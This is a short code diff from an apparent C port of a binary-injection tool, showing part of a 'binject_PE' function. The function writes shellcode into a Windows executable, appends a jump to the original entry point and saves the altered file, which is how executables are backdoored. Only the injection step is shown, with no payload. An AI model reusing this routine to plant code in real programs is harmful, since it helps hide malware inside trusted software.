@@ -27,7 +27,7 @@ int binject_PE(char *file,char *shellcode,int method)
 				if(x!=0)
 				{ 
 					sclen+=5;
-					char *shellcodefixed =ApplySuffixJmpIntel64(shellcodeBytes, uint32(scAddr), uint32(entryPoint), binary.LittleEndian);
+					char *shellcodefixed =ApplySuffixJmpIntel64(shellcode, x,oryginal_entry,0 );
 					memcpy(file_buffer+x,shellcodefixed,sclen);
 					fwrite(file_buffer,1,size,f);
 					free(shellcodefixed);
